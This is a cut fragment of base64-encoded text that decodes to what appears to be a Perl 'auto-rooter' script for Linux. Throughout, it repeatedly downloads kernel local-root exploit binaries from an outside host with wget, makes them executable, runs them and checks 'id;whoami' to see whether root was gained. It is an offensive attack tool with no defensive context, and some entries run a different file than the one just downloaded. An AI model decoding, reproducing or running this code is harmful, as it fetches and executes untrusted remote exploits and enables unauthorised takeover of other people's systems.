tKCIuLzEwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMSIpOw0Kc3lzdGVtKCIuLzExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEyIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxMiIpOw0Kc3lzdGVtKCIuLzEyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNCIpOw0Kc3lzdGVtKCIuLzE0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1LnNoIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNS5zaCIpOw0Kc3lzdGVtKCIuLzE1LnNoIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1MTUwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNTE1MCIpOw0Kc3lzdGVtKCIuLzE1MTUwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1MjAwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNTIwMCIpOw0Kc3lzdGVtKCIuLzE1MjAwIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE2Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxNiIpOw0Kc3lzdGVtKCIuLzE2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE2LTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE2LTEiKTsNCnN5c3RlbSgiLi8xNi0xIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOw0Kc3lzdGVtKCIuLzE4Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4LTUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDE4LTUiKTsNCnN5c3RlbSgiLi8xOC01Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIiKTsNCnN5c3RlbSgiLi8yIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi0xIik7DQpzeXN0ZW0oIi4vMi0xIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi0zMi00Ni0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTYtMzItNDYtMjAxMSIpOw0Kc3lzdGVtKCIuLzItNi0zMi00Ni0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi0zNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi02LTM3Iik7DQpzeXN0ZW0oIi4vMi02LTM3Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi05LTIwMDUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDUiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItNi05LTIwMDYiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDYiKTsNCnN5c3RlbSgiLi8yLTYtOS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuMzQtMjAxMUV4cGxvaXQxIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLTYtOS0yMDA2Iik7DQpzeXN0ZW0oIi4vMi02LTktMjAwNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjQuMjEtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi02LTktMjAwNiIpOw0Kc3lzdGVtKCIuLzItNi05LTIwMDYiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCIuLzIuNC4zNi45Mi42LjI3LjUgLSAyMDA4IExvY2FsIHJvb3QiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE2NC0yMDEwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTE5NCIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0xOTQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4xLTIwMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMS0yMDEwIik7DQpzeXN0ZW0oIi4vMi42LjE4LTE5NC4xLTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMi0yMDEwIik7DQpzeXN0ZW0oIi4vMi42LjE4LTE5NC4yLTIwMTAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTI3NC0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMjc0LTIwMTEiKTsNCnN5c3RlbSgiLi8yLjYuMTgtMjc0LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC02LXg4Ni0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMi1ob29seXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuMi1ob29seXNoaXQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjAiKTsNCnN5c3RlbSgiLi8yLjYuMjAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwLTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMC0yIik7DQpzeXN0ZW0oIi4vMi42LjIwLTIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjIiKTsNCnN5c3RlbSgiLi8yLjYuMjIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMi0yMDA4Iik7DQpzeXN0ZW0oIi4vMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMi02LTg2XzY0LTIwMDciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIzLTIuNi4yNCIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNF8yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjMtMi42LjI0XzIiKTsNCnN5c3RlbSgiLi8yLjYuMjMtMi42LjI0XzIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIzLTIuNi4yNyIpOw0Kc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjciKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjQiKTsNCnN5c3RlbSgiLi8yLjYuMjQiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI3LjctZ2VuZXJpIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgiLi8yLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMyLTQ2LjEuQkhzbXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zMi00Ni4xLkJIc21wIik7DQpzeXN0ZW0oIi4vMi42LjMyLTQ2LjEuQkhzbXAiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzMiKTsNCnN5c3RlbSgiLi8yLjYuMzMiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzLTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi4zNC0yMDExIik7DQpzeXN0ZW0oIi4vMi42LjM0LTIwMTEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MSIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExRXhwbG9pdDEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExRXhwbG9pdDIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzciKTsNCnN5c3RlbSgiLi8yLjYuMTgtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzctcmMyIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzctcmMyIik7DQpzeXN0ZW0oIi4vMi42LjM3LXJjMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNV9ob29seXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNi0zNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjYtMzQiKTsNCnN5c3RlbSgiLi8yLjYuNi0zNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNi0zNF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42LTM0X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi42LTM0X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNl9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi43X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi43X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC0yMDA4LjktNjctMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjgtMjAwOC45LTY3LTIwMDgiKTsNCnN5c3RlbSgiLi8yLjYuOC0yMDA4LjktNjctMjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjgtNV9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi44X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi44X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjkiKTsNCnN5c3RlbSgiLi8yLjYuOSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0yMDA0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA0Iik7DQpzeXN0ZW0oIi4vMi42LjktMjAwNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0yMDA4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA4Iik7DQpzeXN0ZW0oIi4vMi42LjktMjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0zNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktMzQiKTsNCnN5c3RlbSgiLi8yLjYuOS0zNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS00Mi4wLjMuRUxzbXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS00Mi4wLjMuRUxzbXAtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiLi8yLjYuOS00Mi4wLjMuRUxzbXAtMjAwNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNTUiKTsNCnN5c3RlbSgiLi8yLjYuOS01NSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0